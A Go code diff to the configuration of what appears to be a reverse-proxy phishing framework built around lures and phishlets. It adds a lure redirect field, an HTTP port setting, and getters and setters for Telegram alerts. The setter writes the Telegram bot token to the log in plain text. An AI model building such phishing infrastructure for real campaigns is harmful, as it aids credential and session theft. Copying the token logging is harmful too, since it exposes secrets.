@@ -28,6 +28,7 @@ type Lure struct {
 	OgImageUrl      string `mapstructure:"og_image" json:"og_image" yaml:"og_image"`
 	OgUrl           string `mapstructure:"og_url" json:"og_url" yaml:"og_url"`
 	PausedUntil     int64  `mapstructure:"paused" json:"paused" yaml:"paused"`
+	PostRedirector  string `mapstructure:"post_redirector" json:"post_redirector" yaml:"post_redirector"`
 }
 
 type SubPhishlet struct {
@@ -74,6 +75,8 @@ type GeneralConfig struct {
 	HttpsPort    int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
 	DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
 	Autocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
+	TelegramEnabled bool   `mapstructure:"telegram_enabled" json:"telegram_enabled" yaml:"telegram_enabled"`
+    HttpPort         int    `mapstructure:"http_port" json:"http_port" yaml:"http_port"`
 
 	Chatid    string `mapstructure:"chatid" json:"chatid" yaml:"chatid"`
 	Teletoken string `mapstructure:"teletoken" json:"teletoken" yaml:"teletoken"`
@@ -878,4 +881,68 @@ func (c *Config) GetStripHeadersStatus() string {
         return "on"
     }
     return "off"
+}
+
+// =============================================================================
+// Telegram getters/setters
+// =============================================================================
+
+func (c *Config) GetTelegramChatID() string {
+    return c.general.Chatid
+}
+
+func (c *Config) GetTelegramBotToken() string {
+    return c.general.Teletoken
+}
+
+func (c *Config) SetTelegramChatID(chatId string) {
+    c.general.Chatid = chatId
+    c.cfg.Set(CFG_GENERAL, c.general)
+    log.Info("Telegram Chat ID set to: %s", chatId)
+    c.cfg.WriteConfig()
+}
+
+func (c *Config) SetTelegramBotToken(token string) {
+    c.general.Teletoken = token
+    c.cfg.Set(CFG_GENERAL, c.general)
+    log.Info("Telegram Bot Token set to: %s", token)
+    c.cfg.WriteConfig()
+}
+
+func (c *Config) SetTelegramEnabled(enabled bool) {
+    c.general.TelegramEnabled = enabled
+    c.cfg.Set(CFG_GENERAL, c.general)
+    if enabled {
+        log.Info("Telegram notifications enabled")
+    } else {
+        log.Info("Telegram notifications disabled")
+    }
+    c.cfg.WriteConfig()
+}
+
+func (c *Config) GetTelegramEnabled() bool {
+    return c.general.TelegramEnabled
+}
+
+// =============================================================================
+// Missing getters
+// =============================================================================
+
+func (c *Config) GetLureCount() int {
+    return len(c.lures)
+}
+
+func (c *Config) GetHttpPort() int {
+    if c.general.HttpPort == 0 {
+        return 80
+    }
+    return c.general.HttpPort
+}
+
+func (c *Config) GetUnauthUrl() string {
+    return c.general.UnauthUrl
+}
+
+func (c *Config) GetLureGenerationStrategy() string {
+    return "random"
 }
